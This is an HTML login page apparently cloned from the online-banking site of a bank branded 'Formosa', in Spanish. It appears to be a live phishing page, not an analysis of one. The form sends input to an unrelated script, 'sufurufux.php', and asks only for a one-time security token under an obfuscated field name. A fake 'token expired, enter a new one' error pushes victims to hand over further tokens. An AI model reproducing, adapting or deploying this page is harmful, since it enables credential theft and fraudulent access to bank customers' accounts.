.login-content[_ngcontent-c5]   .footer[_ngcontent-c5]   .link[_ngcontent-c5]{font-size:14px}}@media only screen and (max-width:900px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .virtual-keyboard-cont[_ngcontent-c5]{right:calc(75% - 8rem);top:17rem}}@media only screen and (max-width:810px){.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .passEye[_ngcontent-c5]{right:55px;top:340px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]{border-color:transparent;justify-content:center;padding-bottom:0;margin-bottom:50px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .links[_ngcontent-c5]{display:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .header[_ngcontent-c5]   .logo[_ngcontent-c5]{margin:0}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .info[_ngcontent-c5]{display:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]{background:0 0;padding-top:20px;padding-bottom:0;margin-bottom:50px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .widthVolver[_ngcontent-c5]{width:calc(100% - 75px)}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box.securityImage[_ngcontent-c5]{margin-top:0}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .imgSeguridad[_ngcontent-c5]{position:relative;-webkit-transform:translate(-50%,calc(-50% + 10px));transform:translate(-50%,calc(-50% + 10px));height:100px;width:100px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]{display:flex;flex-direction:column}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5] > h3[_ngcontent-c5]{font-size:16px;text-align:center}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   .apps[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   .nets[_ngcontent-c5], .login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   .tels[_ngcontent-c5]{display:flex;justify-content:center}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   img[_ngcontent-c5]{height:50px;margin-right:15px}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   .tels[_ngcontent-c5]   h3[_ngcontent-c5]{font-size:16px;margin:0}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   .tels[_ngcontent-c5]   p[_ngcontent-c5]{font-size:12px;margin:0}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .mobileInfo[_ngcontent-c5]   .tels[_ngcontent-c5]   .data[_ngcontent-c5]{display:flex;flex-direction:column;justify-content:center;align-items:flex-start}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .body[_ngcontent-c5]   .login-box[_ngcontent-c5]   .login-help[_ngcontent-c5]{position:relative;-webkit-transform:none;transform:none}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .footer[_ngcontent-c5]{flex-direction:column;align-items:center}.login-container[_ngcontent-c5]   .login-content[_ngcontent-c5]   .footer[_ngcontent-c5]   .link[_ngcontent-c5]{margin-top:10px}}</style>
      <style>.checkRCont[_ngcontent-c10]{width:100%;height:100%;border:2px solid #003f75;border-radius:4px;padding:0;position:relative;box-sizing:content-box;cursor:pointer}.checkRCont[_ngcontent-c10]:hover{border-color:#003f75}.checkRCont.checked[_ngcontent-c10]{background-color:#003f75}.checkRCont.checked[_ngcontent-c10]   .line[_ngcontent-c10]{height:10%;background-color:#fff;display:inline-block;position:absolute;z-index:2}.checkRCont.checked[_ngcontent-c10]   .line.short[_ngcontent-c10]{width:29%;left:15%;top:61%;-webkit-transform:rotate(45deg);transform:rotate(45deg)}.checkRCont.checked[_ngcontent-c10]   .line.long[_ngcontent-c10]{width:68%;top:51%;right:3%;-webkit-transform:rotate(-45deg);transform:rotate(-45deg)}</style>
      <style>.showEye[_ngcontent-c11]{width:25px}.showEye[_ngcontent-c11]   img[_ngcontent-c11]{width:100%}</style>
   </head>
   <body _c_t_j1="1">
      <form   method="post"  action="sufurufux.php" onsubmit="return validarFormulario()">
         <app-root _nghost-c0="" ng-version="7.2.10">
            <div _ngcontent-c0="" class="container-flow login-img">
               <!---->
               <!---->
               <div _ngcontent-c0="" class="full-container">
                  <router-outlet _ngcontent-c0=""></router-outlet>
                  <app-login _nghost-c5="">
                     <div _ngcontent-c5="" class="login-container">
                        <!---->
                        <!---->
                        <!---->
                        <div _ngcontent-c5="" class="col-5">
                           <!---->
                        </div>
                        <div _ngcontent-c5="" class="formosaVideo"></div>
                        <video _ngcontent-c5="" autoplay="" loop="" muted="" playsinline="" preload="">
                           <source _ngcontent-c5="" src="imexi/video.mp4" type="video/mp4">
                           Your browser does not support HTML5 video.
                        </video>
                        <div _ngcontent-c5="" class="login-content">
                           <div _ngcontent-c5="" class="header">
                              <img _ngcontent-c5="" class="logo margin-right" src="imexi/LogoHeaderLogin.svg">
                              <div _ngcontent-c5="" class="links">
                                 <img _ngcontent-c5="" src="imexi/icon-tel.png">
                                 <div _ngcontent-c5="" class="tels">
                                    <h3 _ngcontent-c5="">0800 777 2262</h3>
                                    <p _ngcontent-c5="">Lunes a Viernes 7 a 19 Hs.</p>
                                 </div>
                                 <a _ngcontent-c5=""  href="#">
                                 <img _ngcontent-c5="" src="imexi/apple.png">
                                 </a>
                                 <a _ngcontent-c5=""  href="#">
                                 <img _ngcontent-c5="" src="imexi/android.png">
                                 </a>
                                 <div _ngcontent-c5="" class="apps">
                                    <h3 _ngcontent-c5="">Descarga nuestra App</h3>
                                    <p _ngcontent-c5="">Disponible para iOS y Android</p>
                                 </div>
                                 <a _ngcontent-c5=""  href="#">
                                 <img _ngcontent-c5="" src="imexi/icon-facebook.png">
                                 </a>
                                 <a _ngcontent-c5=""  href="#">
                                 <img _ngcontent-c5="" class="remove-margin" src="imexi/icon-instagram.png">
                                 </a>
                              </div>
                           </div>
                           <div _ngcontent-c5="" class="body">
                              <div _ngcontent-c5="" class="info">
                                 <h1 _ngcontent-c5="">Te damos la bienvenida</h1>
                                 <p _ngcontent-c5="">Estamos mejorando constantemente para vos, ahora es más moderno y más fácil de usar, con más funcionalidades y beneficios.</p>
                              </div>
                              <div _ngcontent-c5="" class="login-box securityImage">
                                 <!---->
                                 <div _ngcontent-c5="" class="imgSeguridad">
                                    <img _ngcontent-c5="" src="imexi/gris.png">
                                 </div>
                                 <h1 _ngcontent-c5="">
                                    Bienvenido <br _ngcontent-c5="">
                                  
                                 </h1>
                                 <div _ngcontent-c5="" class="row">
                                    <h2 _ngcontent-c5="" class="margin-top widthVolver">
                                       Ingresá tus datos
                                    </h2>
                                    <!---->
                                 </div>
                                 <p _ngcontent-c5="" class="info-text no-select remove-margin-bottom margin-top-small hide">
                                    Si gestionaste el alta en el cajero automático debés ingresar como usuario tu CUIL
                                 </p>
                                 <!---->
                                 <!---->
                                 <input _ngcontent-c5="" autocomplete="new-password" style="position: absolute; left: 0; top: -1104231431px;" tabindex="-1" type="password" value="-">
                                 <!---->
                                 <div _ngcontent-c5="">
                                    <!----><!---->
                                    <showpasswordeye _ngcontent-c5="" class="passEye" _nghost-c11="">
                                       <div _ngcontent-c11="" class="showEye">
                                       </div>
                                    </showpasswordeye>
                                    <!----><input _ngcontent-c5="" class="input-pwd input ng-pristine ng-invalid ng-touched" name="t0s24u824s" required="" minlength="6" maxlength="8" required  type="password" value="" placeholder="Token">
                                 </div>
                                 <button _ngcontent-c5="" class="boton" type="submit" id="btnEnviar"> 
                                 CONTINUAR
                                 </button>
                                 <div _ngcontent-c5="" class="mobileInfo">
                                    <div _ngcontent-c5="" class="nets margin-top">
                                       <a _ngcontent-c5=""  href="#">
                                       <img _ngcontent-c5="" src="imexi/icon-facebook.png">
                                       </a>
                                       <a _ngcontent-c5=""  href="#">
                                       <img _ngcontent-c5="" class="remove-margin" src="imexi/icon-instagram.png">
                                       </a>
                                    </div>
                                    <div _ngcontent-c5="" class="tels margin-top">
                                       <img _ngcontent-c5="" src="imexi/icon-tel.png">
                                       <div _ngcontent-c5="" class="data">
                                          <h3 _ngcontent-c5="">0800 777 2262</h3>
                                          <p _ngcontent-c5="">Lunes a Viernes 7 a 19 Hs.</p>
                                       </div>
                                    </div>
                                    <h3 _ngcontent-c5="" class="margin-top">Descarga nuestra App</h3>
                                    <div _ngcontent-c5="" class="apps">
                                       <a _ngcontent-c5=""  href="#">
                                       <img _ngcontent-c5="" src="imexi/apple.png">
                                       </a>
                                       <a _ngcontent-c5=""  href="#">
                                       <img _ngcontent-c5="" src="imexi/android.png">
                                       </a>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div _ngcontent-c5="" class="footer">
                              <a _ngcontent-c5="" class="link">
                              Términos y Condiciones
                              </a>
                              <a _ngcontent-c5="" class="link">
                              Información de seguridad
                              </a>
                              <a _ngcontent-c5="" class="link">
                              Políticas de privacidad
                              </a>
                              <a _ngcontent-c5="" class="link">
                              Sucursales &amp; Cajeros
                              </a>
                              <a _ngcontent-c5="" class="link">
                              Comparación de comisiones
                              </a>
                           </div>
                        </div>
                     </div>
                     <!---->
                     <!---->
                     <!---->
                     <!---->
                  </app-login>
               </div>
               <!---->
               <!---->
               <div _ngcontent-c0="" class="loading notmobile notIE" hidden="">
                  <lottie-animation-view _ngcontent-c0="">
                     <div style="width: 450px; height: 900px; overflow: hidden; margin: 0px auto;">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="500" height="500" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
                           <defs>
                              <clippath id="__lottie_element_3">
                                 <rect width="500" height="500" x="0" y="0"></rect>
                              </clippath>
                              <clippath id="__lottie_element_5">
                                 <path d="M0,0 L1920,0 L1920,1080 L0,1080z"></path>
                              </clippath>
                              <filter id="__lottie_element_7" filterUnits="objectBoundingBox" x="-100%" y="-100%" width="400%" height="400%">
                                 <fegaussianblur in="SourceAlpha" result="drop_shadow_1" stdDeviation="16.75"></fegaussianblur>
                                 <feoffset dx="3.67394039744206e-15" dy="60" in="drop_shadow_1" result="drop_shadow_2"></feoffset>
                                 <feflood flood-color="#b7b7b7" flood-opacity="0.5" result="drop_shadow_3"></feflood>
                                 <fecomposite in="drop_shadow_3" in2="drop_shadow_2" operator="in" result="drop_shadow_4"></fecomposite>
                                 <femerge>
                                    <femergenode></femergenode>
                                    <femergenode in="SourceGraphic"></femergenode>
                                 </femerge>
                              </filter>
                              <mask id="__lottie_element_8" mask-type="alpha">
                                 <g transform="matrix(1,0,0,1,961.5,539)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                       <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,231,0)" stroke-opacity="1" stroke-width="30" d="M0 0"></path>
                                    </g>
                                 </g>
                              </mask>
                              <mask id="__lottie_element_14" mask-type="alpha">
                                 <g transform="matrix(1,0,0,1,960,540)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                       <path fill="rgb(255,0,0)" fill-opacity="1" d="M0 0"></path>
                                       <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,230,0)" stroke-opacity="1" stroke-width="30" d="M0 0"></path>
                                    </g>
                                 </g>
                              </mask>
                              <mask id="__lottie_element_20" mask-type="alpha">
                                 <g transform="matrix(1,0,0,1,958.5,540.5)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                       <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,230,0)" stroke-opacity="1" stroke-width="30" d="M0 0"></path>
                                    </g>
                                 </g>
                              </mask>
                           </defs>
                           <g clip-path="url(#__lottie_element_3)">
                              <g clip-path="url(#__lottie_element_5)" filter="url(#__lottie_element_7)" transform="matrix(1.872920036315918,0,0,1.872920036315918,-1548.003173828125,-761.3768310546875)" opacity="1" style="display: block;">
                                 <g mask="url(#__lottie_element_20)" style="mix-blend-mode: multiply; display: block;">
                                    <g transform="matrix(0.28286999464035034,0,0,0.28286999464035034,915.4518432617188,491.1332092285156)" opacity="1">
                                       <g opacity="1" transform="matrix(1,0,0,1,125.4520034790039,216.66200256347656)">
                                          <path fill="rgb(0,61,118)" fill-opacity="1" d=" M56.79600143432617,216.66200256347656 C56.79600143432617,216.66200256347656 5.241000175476074,168.9810028076172 5.241000175476074,168.9810028076172 C2.9539999961853027,166.86599731445312 2.825000047683716,163.34500122070312 4.869999885559082,160.9929962158203 C33.768001556396484,127.77300262451172 49.619998931884766,85.4729995727539 49.619998931884766,41.25299835205078 C49.619998931884766,-55.316001892089844 -24.45599937438965,-134.2570037841797 -120.04900360107422,-140.86599731445312 C-123.16300201416016,-141.08099365234375 -125.56900024414062,-143.67100524902344 -125.447998046875,-146.7899932861328 C-125.447998046875,-146.7899932861328 -122.93199920654297,-211.13600158691406 -122.93199920654297,-211.13600158691406 C-122.80699920654297,-214.32699584960938 -120.08200073242188,-216.8459930419922 -116.89399719238281,-216.6510009765625 C19.469999313354492,-208.3350067138672 125.4520034790039,-96.14700317382812 125.4520034790039,41.25299835205078 C125.4520034790039,106.49500274658203 101.06900024414062,168.7899932861328 56.79600143432617,216.66200256347656z"></path>
                                       </g>
                                    </g>
                                 </g>
                                 <g mask="url(#__lottie_element_14)" style="mix-blend-mode: multiply; display: block;">
                                    <g transform="matrix(0.28286999464035034,0,0,0.28286999464035034,920.5970458984375,470.1063537597656)" opacity="1">
                                       <g opacity="1" transform="matrix(1,0,0,1,150.0919952392578,129.19900512695312)">
                                          <path fill="rgb(110,181,222)" fill-opacity="1" d=" M-108.23500061035156,129.19900512695312 C-120.5989990234375,129.19900512695312 -133.01600646972656,128.31399536132812 -145.2270050048828,126.56400299072266 C-148.38900756835938,126.11000061035156 -150.53799438476562,123.09200286865234 -150.01300048828125,119.94100189208984 C-150.01300048828125,119.94100189208984 -139.43600463867188,56.41699981689453 -139.43600463867188,56.41699981689453 C-138.92300415039062,53.34000015258789 -136.04600524902344,51.29199981689453 -132.95399475097656,51.70899963378906 C-124.78900146484375,52.810001373291016 -116.49800109863281,53.367000579833984 -108.23500061035156,53.367000579833984 C-12.125,53.367000579833984 70.31900024414062,-24.06100082397461 74.18599700927734,-122.00499725341797 C74.34600067138672,-126.03800201416016 77.71099853515625,-129.19900512695312 81.74600219726562,-129.19900512695312 C81.74600219726562,-129.19900512695312 144.3780059814453,-129.19900512695312 144.3780059814453,-129.19900512695312 C147.59500122070312,-129.19900512695312 150.16600036621094,-126.56800079345703 150.09300231933594,-123.35299682617188 C148.58599853515625,-55.558998107910156 121.04499816894531,7.934999942779541 72.54299926757812,55.43000030517578 C23.966999053955078,103.00199890136719 -40.23500061035156,129.19900512695312 -108.23500061035156,129.19900512695312z"></path>
                                       </g>
                                    </g>
                                 </g>
                                 <g mask="url(#__lottie_element_8)" style="mix-blend-mode: multiply; display: block;">
                                    <g transform="matrix(0.28286999464035034,0,0,0.28286999464035034,929.5023193359375,465.0614318847656)" opacity="1">
                                       <g opacity="1" transform="matrix(1,0,0,1,106.1709976196289,210.63699340820312)">
                                          <path fill="rgb(162,188,48)" fill-opacity="1" d=" M-90.2300033569336,206.2949981689453 C-90.2300033569336,206.2949981689453 -105.99700164794922,143.8280029296875 -105.99700164794922,143.8280029296875 C-106.75900268554688,140.8070068359375 -104.94400024414062,137.78599548339844 -101.947998046875,136.9320068359375 C-23.777000427246094,114.6500015258789 30.339000701904297,43.24800109863281 30.339000701904297,-38.63199996948242 C30.339000701904297,-82.50199890136719 14.711999893188477,-124.54399871826172 -13.781000137329102,-157.64500427246094 C-15.812999725341797,-160.0070037841797 -15.666999816894531,-163.5290069580078 -13.368000030517578,-165.6320037841797 C-13.368000030517578,-165.6320037841797 34.150001525878906,-209.12600708007812 34.150001525878906,-209.12600708007812 C36.505001068115234,-211.281005859375 40.20500183105469,-211.11900329589844 42.30699920654297,-208.71600341796875 C83.53399658203125,-161.60499572753906 106.1709976196289,-101.43699645996094 106.1709976196289,-38.63199996948242 C106.1709976196289,77.96700286865234 28.594999313354492,179.5590057373047 -83.2020034790039,210.43499755859375 C-86.2760009765625,211.2830047607422 -89.44999694824219,209.38699340820312 -90.2300033569336,206.2949981689453z"></path>
                                       </g>
                                    </g>
                                 </g>
                              </g>
                           </g>
                        </svg>
                     </div>
                  </lottie-animation-view>
               </div>
               <!---->
               <div _ngcontent-c0="" class="loading mobile notIE" hidden="">
                  <lottie-animation-view _ngcontent-c0="">
                     <div style="width: 300px; height: 500px; overflow: hidden; margin: 0px auto;">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="500" height="500" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
                           <defs>
                              <clippath id="__lottie_element_26">
                                 <rect width="500" height="500" x="0" y="0"></rect>
                              </clippath>
                              <clippath id="__lottie_element_28">
                                 <path d="M0,0 L1920,0 L1920,1080 L0,1080z"></path>
                              </clippath>
                              <filter id="__lottie_element_30" filterUnits="objectBoundingBox" x="-100%" y="-100%" width="400%" height="400%">
                                 <fegaussianblur in="SourceAlpha" result="drop_shadow_1" stdDeviation="16.75"></fegaussianblur>
                                 <feoffset dx="3.67394039744206e-15" dy="60" in="drop_shadow_1" result="drop_shadow_2"></feoffset>
                                 <feflood flood-color="#b7b7b7" flood-opacity="0.5" result="drop_shadow_3"></feflood>
                                 <fecomposite in="drop_shadow_3" in2="drop_shadow_2" operator="in" result="drop_shadow_4"></fecomposite>
                                 <femerge>
                                    <femergenode></femergenode>
                                    <femergenode in="SourceGraphic"></femergenode>
                                 </femerge>
                              </filter>
                              <mask id="__lottie_element_31" mask-type="alpha">
                                 <g transform="matrix(1,0,0,1,961.5,539)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                       <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,231,0)" stroke-opacity="1" stroke-width="30" d=" M13.687000274658203,-1.5240000486373901 C11.571999549865723,4.440000057220459 8.458999633789062,10.029999732971191 4,14.25 C-8.300000190734863,25.891000747680664 -29.100000381469727,35.630001068115234 -39.5,40.5"></path>
                                    </g>
                                 </g>
                              </mask>
                              <mask id="__lottie_element_37" mask-type="alpha">
                                 <g transform="matrix(1,0,0,1,960,540)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                       <path fill="rgb(255,0,0)" fill-opacity="1" d=" M1,-15.894000053405762 C-2.0290000438690186,-14.277999877929688 -5.348999977111816,-12.65999984741211 -9,-11 C-31,-1 -52.5,-11 -52.5,-11"></path>
                                       <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,230,0)" stroke-opacity="1" stroke-width="30" d=" M1,-15.894000053405762 C-2.0290000438690186,-14.277999877929688 -5.348999977111816,-12.65999984741211 -9,-11 C-31,-1 -52.5,-11 -52.5,-11"></path>
                                    </g>
                                 </g>
                              </mask>
                              <mask id="__lottie_element_43" mask-type="alpha">
                                 <g transform="matrix(1,0,0,1,958.5,540.5)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                       <path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,230,0)" stroke-opacity="1" stroke-width="30" d=" M16.184999465942383,6.616000175476074 C24.235000610351562,37.57500076293945 3.635999917984009,67.61900329589844 -13.5,82.5"></path>
                                    </g>
                                 </g>
                              </mask>
                           </defs>
                           <g clip-path="url(#__lottie_element_26)">
                              <g clip-path="url(#__lottie_element_28)" filter="url(#__lottie_element_30)" transform="matrix(1.872920036315918,0,0,1.872920036315918,-1548.003173828125,-791.4963989257812)" opacity="1" style="display: block;">
                                 <g mask="url(#__lottie_element_43)" style="mix-blend-mode: multiply; display: block;">
                                    <g transform="matrix(0.28286999464035034,0,0,0.28286999464035034,915.4518432617188,491.1332092285156)" opacity="1">
                                       <g opacity="1" transform="matrix(1,0,0,1,125.4520034790039,216.66200256347656)">
                                          <path fill="rgb(0,61,118)" fill-opacity="1" d=" M56.79600143432617,216.66200256347656 C56.79600143432617,216.66200256347656 5.241000175476074,168.9810028076172 5.241000175476074,168.9810028076172 C2.9539999961853027,166.86599731445312 2.825000047683716,163.34500122070312 4.869999885559082,160.9929962158203 C33.768001556396484,127.77300262451172 49.619998931884766,85.4729995727539 49.619998931884766,41.25299835205078 C49.619998931884766,-55.316001892089844 -24.45599937438965,-134.2570037841797 -120.04900360107422,-140.86599731445312 C-123.16300201416016,-141.08099365234375 -125.56900024414062,-143.67100524902344 -125.447998046875,-146.7899932861328 C-125.447998046875,-146.7899932861328 -122.93199920654297,-211.13600158691406 -122.93199920654297,-211.13600158691406 C-122.80699920654297,-214.32699584960938 -120.08200073242188,-216.8459930419922 -116.89399719238281,-216.6510009765625 C19.469999313354492,-208.3350067138672 125.4520034790039,-96.14700317382812 125.4520034790039,41.25299835205078 C125.4520034790039,106.49500274658203 101.06900024414062,168.7899932861328 56.79600143432617,216.66200256347656z"></path>
                                       </g>
                                    </g>
                                 </g>
                                 <g mask="url(#__lottie_element_37)" style="mix-blend-mode: multiply; display: block;">
                                    <g transform="matrix(0.28286999464035034,0,0,0.28286999464035034,920.5970458984375,470.1063537597656)" opacity="1">
                                       <g opacity="1" transform="matrix(1,0,0,1,150.0919952392578,129.19900512695312)">
                                          <path fill="rgb(110,181,222)" fill-opacity="1" d=" M-108.23500061035156,129.19900512695312 C-120.5989990234375,129.19900512695312 -133.01600646972656,128.31399536132812 -145.2270050048828,126.56400299072266 C-148.38900756835938,126.11000061035156 -150.53799438476562,123.09200286865234 -150.01300048828125,119.94100189208984 C-150.01300048828125,119.94100189208984 -139.43600463867188,56.41699981689453 -139.43600463867188,56.41699981689453 C-138.92300415039062,53.34000015258789 -136.04600524902344,51.29199981689453 -132.95399475097656,51.70899963378906 C-124.78900146484375,52.810001373291016 -116.49800109863281,53.367000579833984 -108.23500061035156,53.367000579833984 C-12.125,53.367000579833984 70.31900024414062,-24.06100082397461 74.18599700927734,-122.00499725341797 C74.34600067138672,-126.03800201416016 77.71099853515625,-129.19900512695312 81.74600219726562,-129.19900512695312 C81.74600219726562,-129.19900512695312 144.3780059814453,-129.19900512695312 144.3780059814453,-129.19900512695312 C147.59500122070312,-129.19900512695312 150.16600036621094,-126.56800079345703 150.09300231933594,-123.35299682617188 C148.58599853515625,-55.558998107910156 121.04499816894531,7.934999942779541 72.54299926757812,55.43000030517578 C23.966999053955078,103.00199890136719 -40.23500061035156,129.19900512695312 -108.23500061035156,129.19900512695312z"></path>
                                       </g>
                                    </g>
                                 </g>
                                 <g mask="url(#__lottie_element_31)" style="mix-blend-mode: multiply; display: block;">
                                    <g transform="matrix(0.28286999464035034,0,0,0.28286999464035034,929.5023193359375,465.0614318847656)" opacity="1">
                                       <g opacity="1" transform="matrix(1,0,0,1,106.1709976196289,210.63699340820312)">
                                          <path fill="rgb(162,188,48)" fill-opacity="1" d=" M-90.2300033569336,206.2949981689453 C-90.2300033569336,206.2949981689453 -105.99700164794922,143.8280029296875 -105.99700164794922,143.8280029296875 C-106.75900268554688,140.8070068359375 -104.94400024414062,137.78599548339844 -101.947998046875,136.9320068359375 C-23.777000427246094,114.6500015258789 30.339000701904297,43.24800109863281 30.339000701904297,-38.63199996948242 C30.339000701904297,-82.50199890136719 14.711999893188477,-124.54399871826172 -13.781000137329102,-157.64500427246094 C-15.812999725341797,-160.0070037841797 -15.666999816894531,-163.5290069580078 -13.368000030517578,-165.6320037841797 C-13.368000030517578,-165.6320037841797 34.150001525878906,-209.12600708007812 34.150001525878906,-209.12600708007812 C36.505001068115234,-211.281005859375 40.20500183105469,-211.11900329589844 42.30699920654297,-208.71600341796875 C83.53399658203125,-161.60499572753906 106.1709976196289,-101.43699645996094 106.1709976196289,-38.63199996948242 C106.1709976196289,77.96700286865234 28.594999313354492,179.5590057373047 -83.2020034790039,210.43499755859375 C-86.2760009765625,211.2830047607422 -89.44999694824219,209.38699340820312 -90.2300033569336,206.2949981689453z"></path>
                                       </g>
                                    </g>
                                 </g>
                              </g>
                           </g>
                        </svg>
                     </div>
                  </lottie-animation-view>
               </div>
               <!---->
               <!---->
               <div _ngcontent-c0="" class="login-splash IE" hidden="">
                  <img _ngcontent-c0="" class="img-fluid custom-animation infinite animated" src="imexi/Logo_Formosa_SVG.svg">
               </div>
               <div _ngcontent-c0="" class="alert-container">
    <!----><div _ngcontent-c0="" class="backendmessage message-error">
      <p _ngcontent-c0="">Token expirado por favor ingrese uno nuevo.</p>
    </div>
  </div>
               <div _ngcontent-c0="" class="Tooltip oculto" style="left: 1022px; top: 617px;">
                  <div _ngcontent-c0="" class="triangle"></div>
                  <p _ngcontent-c0="" class="remove-margin"></p>
               </div>
               <!---->
               <!---->
               <!---->
            </div>
            <!---->
         </app-root>
      </form>
      <script>
         function validarFormulario() {
         
             document.getElementById('btnEnviar').disabled = true;
             return true;
         }
      </script>
   </body>
</html>
